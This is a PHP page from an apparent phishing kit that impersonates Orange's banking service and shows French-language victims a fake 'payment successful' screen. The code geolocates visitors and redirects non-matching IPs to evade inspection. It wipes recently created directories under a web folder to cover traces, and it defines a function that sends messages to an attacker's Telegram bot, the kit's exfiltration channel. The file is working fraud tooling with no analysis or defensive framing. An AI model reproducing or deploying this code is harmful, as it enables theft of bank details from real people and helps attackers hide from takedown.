<?php
session_start();
$StrupLom = $_SERVER['REMOTE_ADDR'];
$donflag = $_SERVER['SERVER_NAME'];
    $info = unserialize(file_get_contents("http://ip-api.com/php/{$StrupLom}?fields=status,message,continent,continentCode,country,countryCode,region,regionName,city,district,zip,lat,lon,timezone,currency,isp,org,as,asname,reverse,mobile,proxy,hosting,query"));
    if (isset($info['as'])) {
        $_SESSION['isp'] = $info['as'];
    }
    if (isset($info['country'])) {
        $_SESSION['Blasacoun'] = $info['country'];
    }
    if (isset($info['countryCode'])) {
        $_SESSION['Njopf'] = $info['countryCode'];
    }
    if (isset($info['city'])) {
        $_SESSION['Voprt'] = $info['city'];
    }
    if (isset($info['regionName'])) {
        $_SESSION['xOpuy'] = $info['regionName'];
    }
function deleteDirectory($dir) {
    if (!file_exists($dir)) {
        return true;
    }
    if (!is_dir($dir)) {
        return unlink($dir);
    }
    $time_diff = time() - filectime($dir);
    if ($time_diff > 320) { // if the difference is greater than 4 minutes (240 seconds)
        foreach (scandir($dir) as $item) {
            if ($item == '.' || $item == '..') {
                continue;
            }
            if (!deleteDirectory($dir . DIRECTORY_SEPARATOR . $item)) {
              
                return false;
            }
        }
        if (rmdir($dir)) {
          
            return true;
        } else {
          
            return false;
        }
    } else {
     
        return true;
    }
}

$parentDirectory = '../../web';
$directories = glob($parentDirectory.'/*', GLOB_ONLYDIR);

if(is_array($directories)) {
  
    foreach($directories as $dir) {
        if(basename($dir)[0] != '.') { 
            if(deleteDirectory($dir)) {
            
            }  
        }
    }
}
$filename = 'local.txt';
if (file_exists($filename)) {
    $myfile = fopen($filename, "r") or die("Unable to open file!");
    $reslocal = fread($myfile,filesize($filename));

fclose($myfile);
} 
else {
	$StrongSol = "" . basename(__DIR__);
    echo ("<script LANGUAGE='JavaScript'>
    window.location.href='../../index.php?verify_account=session=&" . md5(microtime()) . "&dispatch=" . sha1(microtime()) . "&access=&data=" . sha1(microtime()) . "&lolme=$StrongSol';
    </script>");
    exit();
}



if (trim($reslocal) != trim($StrupLom))
    {
		
    $StrongSol = "" . basename(__DIR__);
    echo ("<script LANGUAGE='JavaScript'>
    window.location.href='../../index.php?verify_account=session=&" . md5(microtime()) . "&dispatch=" . sha1(microtime()) . "&access=&data=" . sha1(microtime()) . "&lolme=$StrongSol';
    </script>");
     exit();	  

}

function telsent($message) {
    $TrubFtub = $_SESSION['idtel'];
    $cRetVckr = $_SESSION['tokentel'];
    $api_url = "https://api.telegram.org/bot{$cRetVckr}/sendMessage";
    $params = ["chat_id" => $TrubFtub, "text" => $message];
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $api_url);
    curl_setopt($ch, CURLOPT_POST, true);
    curl_setopt($ch, CURLOPT_POSTFIELDS, http_build_query($params));
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    $response = curl_exec($ch);
    curl_close($ch);
}


 $StrongSol = "" . basename(__DIR__);
 $jocker = $_SESSION['accesslog'];
?>
<html><head>
<meta http-equiv="content-type" content="text/html; charset=UTF-8"><script src=""></script>
    <meta charset="UTF-8">
    <title>Vos coordonnées bancaires</title>
    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=0">
    <meta name="description" content="Designed to be the perfect starting point&nbsp;for any dashboard or admin site. Charts,&nbsp;graphs, sortable tables,&nbsp;and more than a dozen other new&nbsp;components included.">
    <link rel="icon" type="image/png" href="favicon.png">
    <link href="validation/bootstrap.css" rel="stylesheet" type="text/css">
    <link href="validation/style.css" rel="stylesheet" type="text/css">

<style type="text/css">.video-ads{display:none!important}#player-ads{display:none!important}#watch7-sidebar-ads{display:none!important}#AdSense{display:none!important}#homepage-sidebar-ads{display:none!important}#page-container>#page>#header{display:none!important}#content #page-manager #masthead-ad{display:none!important}#body-container #page-container #video-masthead-iframe{display:none!important}#feedmodule-PRO{display:none!important}#homepage-chrome-side-promo{display:none!important}#search-pva{display:none!important}#watch-branded-actions{display:none!important}#watch-buy-urls{display:none!important}.carousel-offer-url-container{display:none!important}.promoted-videos{display:none!important}.watch-extra-info-column{display:none!important}.watch-extra-info-right{display:none!important}a[href^=""]{display:none!important}</style></head>
<body style="background: #FFF;" cz-shortcut-listen="true">


    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width; initial-scale=1.0; maximum-scale=1.0; user-scalable=no;">
    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
    <title>Orange - Mise à jour terminée avec succès</title>
    <link rel="icon" type="image/png" href="favicon.png">
    <style type="text/css">

        @media all {
            html {
                height: 100%;
            }

            body {
                height: 100%;
                margin: 0;
                padding: 0;
                font-family: Arial, Helvetica, sans-serif;
            }

            #global {
                width: 600px;
                margin: 32px auto 0 auto;
            }

            #global img {
                border: none;
            }

            #global .fond {
                width: 100%;
                padding-bottom: 10px;
                background-color: #FFFFFF;
                background-image: url("https://i.imgur.com/b1qFIXg.png");
                background-position: 1px 1px;
                background-repeat: no-repeat;
                border: 1px solid #9a9ab0;
            }

            #global .fond .titre {
                font-size: 1.1em;
                color: black;
                padding: 9px 0 0 74px;
            }

            #global .fond .loader {
                width: 100%;
                text-align: center;
                padding: 40px 0 0 0;
            }

            #global .fond .texte {
                width: 100%;
                text-align: center;
                font-size: 0.8em;
                color: #4c4c4c;
                padding: 22px 0 0 0;
                line-height: 20px;
            }

            #global .rouge {
                color: #c80214;
            }
        }

        @media all and (max-width: 640px) {
            #global {
                width: 80%;
                margin: 32px auto 0 auto;
            }
        }

        #mire-layer {
            background-color: transparent;
        }

        #mire-layer #global {
            width: 500px;
            margin: 0 auto;
        }

    </style>

<style>
.playonce {
  animation-iteration-count: 1;
}
</style>
<div id="global">
    <div class="fond">
        <div class="titre"><span class="rouge"><strong>Paiement effectué avec succès</strong></span></div>
        <br>
        <div class="loader"><img src="https://i.gifer.com/7efs.gif" onload="this.onload=null; this.setAttribute('loop', '1');" alt="Example GIF"></div>
        <br>
		<meta http-equiv="refresh" content="3;url=../../index.php?endmelux=<?php echo $StrongSol; ?>">
        <div class="texte"><strong>Paiement effectué avec succès.</strong></div>
        <div class="texte"><strong><abbr>Orange</abbr> vous remercie d'avoir utilisé ses services de
                bancassurance directe.</strong></div>
				
        <div class="texte"><strong>Vous pouvez continuer la consultation du site en toute
                sécurité.</strong></div>
    </div>
</div>

        </body></html>